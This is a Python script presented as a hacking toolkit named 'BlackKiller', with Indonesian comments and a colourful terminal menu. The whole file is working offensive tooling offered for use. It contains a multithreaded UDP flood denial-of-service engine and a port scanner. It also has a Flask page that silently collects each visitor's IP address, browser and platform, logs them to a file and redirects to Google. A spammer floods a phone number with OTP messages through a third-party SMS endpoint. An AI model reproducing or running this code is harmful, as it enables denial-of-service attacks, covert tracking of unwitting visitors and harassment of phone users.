import os
import sys
import time
import socket
import threading
import requests
import random
import platform
import logging
import datetime
from flask import Flask, request, render_template_string
from colorama import Fore, Style, init

# Inisialisasi Environment
init(autoreset=True)
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- KONFIGURASI DEVELOPER ---
DEV = "Vikk Official"
VERSION = "1.0"
LOG_FILE = "captured_data.txt"

# Palet Warna Neon
R = Fore.RED
G = Fore.GREEN
C = Fore.CYAN
W = Fore.WHITE
Y = Fore.YELLOW

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def glitch_msg(text):
    for char in text:
        sys.stdout.write(f"{random.choice([R, C, W])}{char}")
        sys.stdout.flush()
        time.sleep(0.02)
    print(Style.RESET_ALL)

# --- SYSTEM BOOTING ---
def boot_system():
    clear()
    glitch_msg(">>> INITIATING BLACKKILLER KERNEL v1.0...")
    time.sleep(0.5)
    components = ["NET_LAYER_ESTABLISHED", "UDP_FLOOD_MODULE", "FLASK_STEALER_ONLINE", "AUTH_SUCCESS"]
    for comp in components:
        print(f"{W}[{G}OK{W}] {C}{comp}")
        time.sleep(0.3)
    time.sleep(1)

# --- CORE FUNCTIONS ---
def ddos_engine(ip, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(4096)
    while True:
        try:
            client.sendto(packet, (ip, port))
            sys.stdout.write(f"\r{R}[ATTACK] {W}PACKET SENT TO {ip}:{port} {R}>> {C}FORCE_FLOODING")
        except: break

def scan_engine(target):
    print(f"\n{C}[*] SCANNING PORTS: {W}{target}")
    ports = [21, 22, 23, 80, 443, 3306, 8080]
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target, port)) == 0:
            print(f"    {G}[+] {W}PORT {port: <5} : {G}OPEN")
        s.close()

# --- STEALER BACKEND ---
STEALER_HTML = """
<!DOCTYPE html><html><body style="background:#000" onload="c()">
<script>
function c(){
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
        const info = {ip: d.ip, ua: navigator.userAgent, plt: navigator.platform};
        fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(info)})
        .finally(() => { window.location.href = "https://www.google.com"; });
    });
}
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(STEALER_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.json
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.datetime.now()}] IP: {d['ip']} | OS: {d['plt']} | UA: {d['ua']}\n")
    return {"status": "ok"}

def start_server():
    app.run(host='0.0.0.0', port=8080)

# --- WHATSAPP SPAMMER ---
def spam_engine(no, jml):
    url = "https://id.jagrewala.com/v2/api/sms/check.php"
    for i in range(jml):
        try:
            r = requests.get(url, params={"phone": no, "smsType": "1"}, timeout=5)
            if r.status_code == 200:
                print(f"{G}[SENT] {W}OTP PACKET {i+1} -> {no}")
            time.sleep(1.5)
        except: break

# --- INTERFACE ---
def banner():
    ip = socket.gethostbyname(socket.gethostname())
    os_info = platform.system() + " " + platform.release()
    print(f"""{R}
  ____  _        _    ____ _  _______ _     _     _____ ____  
 | __ )| |      / \  / ___| |/ /_   _| |   | |   | ____|  _ \ 
 |  _ \| |     / _ \| |   | ' /  | | | |   | |   |  _| | |_) |
 | |_) | |___ / ___ \ |___| . \  | | | |___| |___| |___|  _ < 
 |____/|_____/_/   \_\____|_|\_\ |_| |_____|_____|_____|_| \_\\
    """)
    print(f"{C}╔{W}══════════════════════════════════════════════════════════════{C}╗")
    print(f"{C}║ {W}DEV  : {G}{DEV: <18} {W}IP   : {Y}{ip: <18} {C}║")
    print(f"{C}║ {W}OS   : {Y}{os_info[:18]: <18} {W}TIME : {Y}{datetime.datetime.now().strftime('%H:%M:%S'): <18} {C}║")
    print(f"{C}╚{W}══════════════════════════════════════════════════════════════{C}╝")

def main():
    threading.Thread(target=start_server, daemon=True).start()
    boot_system()
    while True:
        clear()
        banner()
        print(f"\n{W}[{R}01{W}] {C}DDOS ATTACK      {W}[{R}04{W}] {C}AUTO STEALER")
        print(f"{W}[{R}02{W}] {C}PORT SCANNER     {W}[{R}05{W}] {C}WA SPAMMER")
        print(f"{W}[{R}03{W}] {C}SQL INJECTION    {W}[{R}00{W}] {C}EXIT SYSTEM")
        cmd = input(f"\n{R}┌─[{DEV}@BlackKiller]\n{R}└──╼ {W}$ ")
        if cmd in ['01', '1']:
            target = input("IP: "); port = int(input("Port: ")); th = int(input("Threads: "))
            for _ in range(th): threading.Thread(target=ddos_engine, args=(target, port)).start()
        elif cmd in ['02', '2']:
            host = input("Target: "); scan_engine(host); input("\nEnter...")
        elif cmd in ['04', '4']:
            print(f"{G}[*] Server Port 8080 Active. Logs: {LOG_FILE}"); input("\nEnter...")
        elif cmd in ['05', '5']:
            num = input("No (62xxx): "); jml = int(input("Jml: ")); spam_engine(num, jml); input("\nEnter...")
        elif cmd in ['00', '0']:
            glitch_msg("SHUTTING DOWN..."); sys.exit()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit()
